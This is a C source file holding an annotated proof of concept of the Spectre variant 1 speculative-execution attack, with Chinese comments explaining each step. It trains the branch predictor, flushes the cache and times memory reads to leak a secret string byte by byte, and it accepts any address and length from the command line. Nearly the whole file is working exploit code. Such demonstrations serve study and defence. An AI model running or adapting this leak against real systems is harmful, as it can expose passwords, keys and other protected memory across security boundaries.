#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16; //
uint8_t unused1[64];//typedef unsigned char   uint8_t;
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16}; //从该数值进行越界读
uint8_t unused2[64];
uint8_t array2[256 * 512]; //通过读取该数组某个值来获取读取速度，从而判断某个内存页面是否加载，从而获取到数组的索引值，即array1的越界值。k=array1[x]。

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function()即防止指令被优化 */

void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512]; //漏洞点：分支的判断。当传入恶意索引x时，也会读取，从而越界。
    }
}

/********************************************************************
 Analysis code
 ********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256]; //对索引命中次数计算
    int tries, i, j, k, mix_i, junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    //清空数组在CPU的缓存
    for (i = 0; i < 256; i++)
        results[i] = 0;                   //结果清0
    for (tries = 999; tries > 0; tries--) /*反复读取恶意地址的值，获取最高和次高概率的索引。*/
    {

        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction 将所有array2所有页面清空*/

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) 5个训练：1次攻击 */
        training_x = tries % array1_size; //%16，training_x为正常访问
        for (j = 29; j >= 0; j--)
        {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 ，每6次有一次为恶意访问*/
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
            x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);         /* READ TIMER */
           junk = *addr;                    /* MEMORY ACCESS TO TIME */
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
                results[mix_i]++; /* cache hit - add +1 to score for this value 缓存中有该数组值对应的页面，则对应的数组索引分数+1*/
        }

        /* Locate highest & second-highest results results tallies in j/k，获取最高和次高分数的索引*/
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
             {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }
    results[0] ^= junk; /* use junk so code above won’t get optimized out*/
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main(int argc, const char **argv)
{
    size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
    printf("secret_addr:%p,array1_addr:%p.\n",(void *)secret,(void *)array1);
    int i, score[2], len = 40;//len为secret的长度
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++)
        array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
    if (argc == 3)
    {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1; /* Convert input value into a pointer */
        sscanf(argv[2], "%d", &len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0)
    {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));//判断标准
        printf("0x%02X=’%c’ score=%d ", value[0],(value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X score=%d\n)", value[1], score[1]);
        printf("\n");
    }
    system("pause");
    return 0;
}